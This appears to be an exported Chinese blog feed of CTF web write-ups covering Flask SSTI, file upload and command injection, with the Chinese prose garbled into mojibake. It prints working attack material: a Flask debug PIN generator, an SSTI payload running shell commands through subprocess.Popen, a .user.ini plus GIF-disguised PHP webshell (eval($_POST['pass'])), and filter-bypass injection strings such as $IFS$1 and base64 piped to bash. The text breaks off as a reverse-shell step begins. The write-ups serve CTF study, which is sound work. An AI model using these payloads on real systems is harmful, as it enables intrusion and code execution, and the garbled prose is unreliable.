æœ€åä¸€ä¸ªå°±æ˜¯æœºå™¨çš„id</span>    <span class="token comment"># å¯¹äºédockeræœºæ¯ä¸€ä¸ªæœºå™¨éƒ½ä¼šæœ‰è‡ªå·²å”¯ä¸€çš„idï¼Œlinuxçš„idä¸€èˆ¬å­˜æ”¾åœ¨/etc/machine-idæˆ–/proc/sys/kernel/random/boot_iï¼Œæœ‰çš„ç³»ç»Ÿæ²¡æœ‰è¿™ä¸¤ä¸ªæ–‡ä»¶ï¼Œ</span>    <span class="token comment"># windowsçš„idè·å–è·Ÿlinuxä¹Ÿä¸åŒã€‚</span>    <span class="token comment"># å¯¹äºdockeræœºåˆ™è¯»å–/proc/self/cgroup</span>    <span class="token string">'44547b3a0bae08513cd0bacbd2f23a304505e1051c10f267af9b86649a6e7c89'</span><span class="token punctuation">]</span>h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> bit<span class="token punctuation">:</span>        <span class="token keyword">continue</span>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>bit<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'cookiesalt'</span><span class="token punctuation">)</span>cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>num <span class="token operator">=</span> <span class="token boolean">None</span><span class="token keyword">if</span> num <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span><span class="token string">b'pinsalt'</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> <span class="token builtin">int</span><span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>rv <span class="token operator">=</span><span class="token boolean">None</span><span class="token keyword">if</span> rv <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>                          <span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">break</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        rv <span class="token operator">=</span> num<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span></code></pre><p>éšåå¾—åˆ°PINç ï¼Œåˆ°debugç•Œé¢ç”¨shellæ‰§è¡Œä»£ç ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/SSTI/image-20200815224222481.png" alt loading="lazy"></p><p>å¾—åˆ°flag</p><p><strong>å‚è€ƒ</strong></p><ul><li><a href="https://www.cnblogs.com/MisakaYuii-Z/p/12407760.html">è®°ä¸€æ¬¡Flaskæ¨¡æ¿æ³¨å…¥å­¦ä¹  [GYCTF2020]FlaskApp</a></li><li><a href="https://www.cnblogs.com/HacTF/p/8160076.html">Flask debug æ¨¡å¼ PIN ç ç”Ÿæˆæœºåˆ¶å®‰å…¨æ€§ç ”ç©¶ç¬”è®°</a></li><li><a href="https://xz.aliyun.com/t/3679">flaskä¹‹sstiæ¨¡ç‰ˆæ³¨å…¥ä»é›¶åˆ°å…¥é—¨</a></li><li><a href="https://xz.aliyun.com/t/6885">Pythonæ¨¡æ¿æ³¨å…¥(SSTI)æ·±å…¥å­¦ä¹ </a></li></ul><h3 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h3><p>å¸¸è§„SSTIï¼Œä¼ å…¥search=49åå‘ç°å­˜åœ¨æ¨¡æ¿æ³¨å…¥ï¼Œäºæ˜¯æ‰“payload</p><p>æµ‹è¯•åå‘ç°ä¼ å…¥ä¸€äº›æ•°æ®åæœåŠ¡å™¨ä¼š500ï¼Œæ¨æµ‹åç«¯åšäº†è¿‡æ»¤ï¼ŒæŸ¥é˜…èµ„æ–™åå‘ç°å¯åˆ©ç”¨<code>subprocess.Popen</code>æ‰§è¡Œå‘½ä»¤</p><p>payloadï¼š<code>?search=&#123;&#123;''.__class__.__mro__[2].__subclasses__()[258]('cat /flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()&#125;&#125;</code></p><p><strong>å‚è€ƒ</strong></p><ul><li><a href="https://github.com/sturmisch/cscctf-problem/tree/master/2019/qual/web/flasklight">å®˜æ–¹wp</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFé¢˜ </tag>
            
            <tag> python </tag>
            
            <tag> SSTI </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-æ–‡ä»¶ä¸Šä¼ </title>
      <link href="posts/592e5fba/"/>
      <url>posts/592e5fba/</url>
      
        <content type="html"><![CDATA[<h3 id="2019SUCTFâ€”CheckIn"><a href="#2019SUCTFâ€”CheckIn" class="headerlink" title="2019SUCTFâ€”CheckIn"></a>2019SUCTFâ€”CheckIn</h3><p>é¢˜ç›®æºç ï¼š<a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn">https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn</a></p><p>å¤ç°é“¾æ¥ï¼š<a href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a></p><span id="more"></span><h4 id="ç•Œé¢"><a href="#ç•Œé¢" class="headerlink" title="ç•Œé¢"></a>ç•Œé¢</h4><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209103925041.png" alt loading="lazy"></p><p>ä¸Šä¼ ä¸€å¥è¯.phpæ–‡ä»¶ï¼Œç»“æœå¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209104816676.png" alt loading="lazy"></p><p>æ›´æ”¹åç¼€å’Œæ–‡ä»¶ç±»å‹ä¸ºå›¾ç‰‡æ ¼å¼ï¼Œç»“æœå¦‚ä¸‹ï¼Œè¿‡æ»¤äº†<code>&lt;?</code></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209105358989.png" alt loading="lazy"></p><p>ç”¨<code>&lt;script language=&#39;php&#39;&gt;&lt;scirpt&gt;</code>ç±»å‹çš„å›¾ç‰‡é©¬ç»•è¿‡ï¼Œç»“æœå¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209105253270.png" alt loading="lazy"></p><p>åº”è¯¥è°ƒç”¨äº†åç«¯çš„<code>exif_imagetype()</code>å‡½æ•°ï¼Œäºæ˜¯æ·»åŠ æ–‡ä»¶å¤´ç»•è¿‡<code>GIF89a</code>ï¼Œä¸Šä¼ æˆåŠŸ</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209110003787.png" alt loading="lazy"></p><p>åˆ°è¿™ä¸€æ­¥åº”è¯¥æƒ³åˆ°ä¸Šä¼ ä¸€ä¸ª<code>.htaccess</code>æ–‡ä»¶æ¥å°†å›¾ç‰‡é©¬è§£æä¸ºphpï¼Œå°è¯•æ— æœï¼Œäºæ˜¯ç”¨åˆ°äº†ä¸‹é¢çš„.user.iniæ–‡ä»¶</p><p>å‚è€ƒ</p><blockquote><p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">user.iniæ–‡ä»¶æ„æˆçš„PHPåé—¨</a></p><p><a href="https://xz.aliyun.com/t/6091#toc-1">ä»SUCTF 2019 CheckIn æµ…è°ˆ.user.iniçš„åˆ©ç”¨</a></p></blockquote><h4 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h4><h5 id="ä¸Šä¼ -uesr-iniæ–‡ä»¶"><a href="#ä¸Šä¼ -uesr-iniæ–‡ä»¶" class="headerlink" title="ä¸Šä¼ .uesr.iniæ–‡ä»¶"></a>ä¸Šä¼ .uesr.iniæ–‡ä»¶</h5><p>å†…å®¹å¦‚ä¸‹ï¼š</p><pre class="language-ini" data-language="ini"><code class="language-ini">GIF89a<span class="token key attr-name">auto_prepend_file</span><span class="token punctuation">=</span><span class="token value attr-value">a.jpg</span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209104439117.png" alt loading="lazy"></p><blockquote><p>iniæ–‡ä»¶è®¾ç½®ä¸­æœ‰ä¸¤ä¸ªå‚æ•°ï¼š<code>auto_prepend_file</code>å’Œ<code>auto_append_file</code></p><p>è¡¨ç¤ºæˆ‘ä»¬æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼ˆå¦‚a.jpgï¼‰ï¼Œé‚£ä¹ˆè¯¥æ–‡ä»¶å°±ä¼šè¢«åŒ…å«åœ¨è¦æ‰§è¡Œçš„phpæ–‡ä»¶ä¸­ï¼ˆå¦‚index.phpï¼‰ï¼Œç±»ä¼¼äºåœ¨index.phpä¸­æ’å…¥ä¸€å¥ï¼š<code>require(./a.jpg);</code></p><p>ä¸¤ä¸ªè®¾ç½®çš„åŒºåˆ«åœ¨äº<strong>auto_prepend_file</strong>æ˜¯åœ¨æ–‡ä»¶å‰æ’å…¥ï¼›<strong>auto_append_file</strong>åœ¨æ–‡ä»¶æœ€åæ’å…¥ï¼ˆå½“æ–‡ä»¶è°ƒç”¨çš„æœ‰<code>exit()</code>æ—¶è¯¥è®¾ç½®æ— æ•ˆï¼‰</p></blockquote><p>åˆ©ç”¨å‰æéœ€è¦æ–‡ä»¶ç›®å½•ä¸‹æœ‰ä¸€ä¸ªå¯æ‰§è¡Œçš„.phpæ–‡ä»¶ï¼Œè€Œé¢˜ç›®åˆšå¥½æœ‰ä¸€ä¸ª</p><h5 id="ä¸Šä¼ a-jpgå›¾ç‰‡é©¬"><a href="#ä¸Šä¼ a-jpgå›¾ç‰‡é©¬" class="headerlink" title="ä¸Šä¼ a.jpgå›¾ç‰‡é©¬"></a>ä¸Šä¼ a.jpgå›¾ç‰‡é©¬</h5><pre class="language-php" data-language="php"><code class="language-php">GIF89a<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string double-quoted-string">"php"</span><span class="token operator">></span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pass'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209113304522.png" alt loading="lazy"></p><p>è®¿é—®index.phpï¼Œç”¨å·¥å…·è¿æ¥åå°ï¼Œåœ¨ç½‘ç«™æ ¹ç›®å½•ä¸‹å¾—åˆ°flag</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/image-20200209113410626.png" alt loading="lazy"></p><p>ä¹Ÿå¯ä»¥å°†å›¾ç‰‡é©¬ä»£ç æ”¹æˆå¦‚ä¸‹æ–¹å¼</p><pre class="language-php" data-language="php"><code class="language-php">GIF89a<span class="token operator">&lt;</span>script language<span class="token operator">=</span><span class="token string single-quoted-string">'php'</span><span class="token operator">></span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'cat /flag'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><p>ç›´æ¥è®¿é—®index.phpå³å¯å¾—åˆ°flag</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFé¢˜ </tag>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-å‘½ä»¤æ‰§è¡Œ</title>
      <link href="posts/c714e372/"/>
      <url>posts/c714e372/</url>
      
        <content type="html"><![CDATA[<h3 id="2019GXYCTF-Ping-Ping-Ping"><a href="#2019GXYCTF-Ping-Ping-Ping" class="headerlink" title="2019GXYCTF-Ping Ping Ping"></a>2019GXYCTF-Ping Ping Ping</h3><p>12æœˆä»½çš„GWYCTFï¼ŒBUUCTFä¸Šå¤ç°</p><p>åˆ«äººå­¦æ ¡æ‹›æ–°çš„é¢˜ç›®ï¼Œæˆ‘è¿˜æ˜¯ä¸ä¼šï¼Œå¤ªèœäº†</p><span id="more"></span><p>å…ˆæ¥çœ‹çœ‹é¢˜ç›®çš„ç•Œé¢</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-96.png" alt loading="lazy"></p><p>ç”±é¢˜æ„å¾—ï¼Œä¼ å‚ip</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-97.png" alt loading="lazy"></p><p>è”æƒ³å‘½ä»¤æ‰§è¡Œï¼Œå‘½ä»¤æ‰§è¡Œçš„æ–¹æ³•å¤§è‡´ä¸¤ç§ï¼š</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token punctuation">;</span>ï¼šç”¨äºè¿ç»­æŒ‡ä»¤æ‰§è¡Œ<span class="token operator">|</span>ï¼šç®¡é“ç¬¦ï¼Œå°†å·¦è¾¹çš„è¾“å‡ºå½“åšå³è¾¹çš„è¾“å…¥ï¼Œåªè¿”å›å³è¾¹çš„ç»“æœ</code></pre><p>å°è¯•åˆ†å·ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-98.png" alt loading="lazy"></p><p>å‘ç°ç›®å½•ä¸‹åŒ…å«ä¸¤ä¸ªæ–‡ä»¶ï¼šindex.php å’Œ flag.php</p><p>å°è¯•catæŸ¥çœ‹ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-99.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-100.png" alt loading="lazy"></p><p>emmmmmmmmmmmmmç©ºæ ¼è¢«åŠäº†ã€‚ã€‚ã€‚</p><p>ä»å¤§ä½¬é‚£å­¦ä¹ ç»•è¿‡ç©ºæ ¼çš„æ–¹æ³•ï¼Œå¤§æ¦‚æœ‰ä»¥ä¸‹å‡ ç§ï¼š</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token environment constant">$IFS</span><span class="token variable">$&#123;<span class="token environment constant">IFS</span>&#125;</span><span class="token environment constant">$IFS</span><span class="token variable">$1</span> //<span class="token variable">$1</span>æ”¹æˆ$åŠ å…¶ä»–æ•°å­—è²Œä¼¼éƒ½è¡Œ<span class="token operator">&lt;</span> <span class="token operator">&lt;></span> <span class="token punctuation">&#123;</span>cat,flag.php<span class="token punctuation">&#125;</span>  //ç”¨é€—å·å®ç°äº†ç©ºæ ¼åŠŸèƒ½%20 %09 </code></pre><p>å„ç§å°è¯•åå‘ç°$IFS$1æœ‰æ•ˆï¼Œåˆ†åˆ«æŸ¥çœ‹ä¸¤ä¸ªæ–‡ä»¶ï¼Œå¦‚å›¾ï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-101.png" alt loading="lazy"></p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-102.png" alt loading="lazy"></p><p>index.phpä»£ç å¦‚ä¸‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token operator">|</span>\'<span class="token operator">|</span>\<span class="token string double-quoted-string">"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\>|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your symbol!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ /"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your space!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/bash/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your bash!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/.*f.*l.*a.*g.*/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your flag!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ping -c 4 "</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>  <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">?</span><span class="token operator">></span> </code></pre><p>å‘ç°å¤§å¤šæ•°ç¬¦å·éƒ½è¢«è¿‡æ»¤ï¼Œä»¥ä¸‹å‡ ç§æ–¹æ³•éƒ½ä¸è¡Œï¼ˆä¸è¿‡å¥½åƒéƒ½æŒºæœ‰ç”¨çš„ï¼Œæ¬æ¥å­¦ä¹ ä¸€ä¸‹ï¼‰ï¼š</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">cat</span> fl* åˆ©ç”¨*åŒ¹é…ä»»æ„ ä¸è¡Œ<span class="token builtin class-name">echo</span> <span class="token string">"Y2F0IGZsYWcucGhw"</span><span class="token operator">|</span> base64 -d <span class="token operator">|</span> <span class="token function">bash</span> ä¹Ÿä¸è¡Œca<span class="token punctuation">\</span>t fl<span class="token punctuation">\</span>ag.php ä¸è¡Œ<span class="token function">cat</span> fl<span class="token string">''</span>ag.php ä¸è¡Œ</code></pre><p>æœ€åä½¿ç”¨å˜é‡æ‹¼æ¥ï¼š</p><p>é¡¾åæ€ä¹‰ï¼Œå˜é‡æ‹¼æ¥å°±æ˜¯ï¼ša=f;b=lag.php;cat $a$b</p><p>åˆ©ç”¨åˆ°è§£é¢˜ä¸­ï¼š</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token assign-left variable">a</span><span class="token operator">=</span>g<span class="token punctuation">;</span><span class="token function">cat</span><span class="token environment constant">$IFS</span><span class="token variable">$1fla</span><span class="token variable">$a</span>.php</code></pre><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-103.png" alt loading="lazy"></p><p>[ãƒ»_ãƒ»?]</p><p>F12å³å¯å¾—å‡ºç­”æ¡ˆï¼š</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-104.png" alt loading="lazy"></p><p>å‚è€ƒå¤§ä½¬åŸæ–‡ï¼š<a href="https://www.jianshu.com/p/fd7f9fcc9333">ping</a></p><h3 id="BJDCTF-2nd-duangShell"><a href="#BJDCTF-2nd-duangShell" class="headerlink" title="BJDCTF-2nd-duangShell"></a>BJDCTF-2nd-duangShell</h3><p>é¦–å…ˆé¦–é¡µæç¤º</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/image-20200327192750978.png" alt loading="lazy"></p><p>.swpæºç æ³„éœ²ï¼Œæ˜¯ä½¿ç”¨vimç¼–è¾‘å™¨çš„ç¼“å­˜æ–‡ä»¶</p><p>äºæ˜¯è®¿é—®<code>url/.index.php.swp</code>ä¸‹è½½è¯¥æ–‡ä»¶ï¼Œç„¶åç”¨<code>vim -r index.php.swp</code>æ¢å¤æ–‡ä»¶ï¼Œå¾—åˆ°æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>en<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>give me a girl<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>ççˆ±ç½‘<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"how can i give you source code? .swp?!"</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'girl_friend'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"where is P3rh4ps's girl friend ???"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$girl</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'girl_friend'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\>|\\\/'</span><span class="token punctuation">,</span> <span class="token variable">$girl</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'just girl'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ls|phpinfo|cat|\%|\^|\~|base64|xxd|echo|\$/i'</span><span class="token punctuation">,</span> <span class="token variable">$girl</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;img src='img/p3_need_beautiful_gf.png'> &lt;!-- He is p3 -->"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//duangShell~~~~</span>        <span class="token function">exec</span><span class="token punctuation">(</span><span class="token variable">$girl</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p>ä»£ç å®¡è®¡ï¼Œå¯ä»¥POSTä¸€ä¸ª<code>girl_friend</code>å‚æ•°ä½†è¿‡æ»¤äº†ä¸€äº›å‚æ•°ï¼Œçœ‹åˆ°æœ€åæ‰§è¡Œå‘½ä»¤ä½¿ç”¨çš„æ˜¯<code>exec</code>çš„å‡½æ•°ï¼Œè¿”å›æœ€åä¸€è¡Œå†…å®¹ï¼Œæ— å›æ˜¾ï¼Œç”±äºçœ‹ä¸åˆ°è¾“å‡ºï¼Œå°±é€‰æ‹©åå¼¹shellæ¥æ‹¿åˆ°ç³»ç»Ÿæƒé™æ‰§è¡Œå‘½ä»¤ã€‚</p><p>æ­£å¥½<code>curl</code>å‘½ä»¤æ²¡ç”¨è¢«ç¦ï¼Œ<a 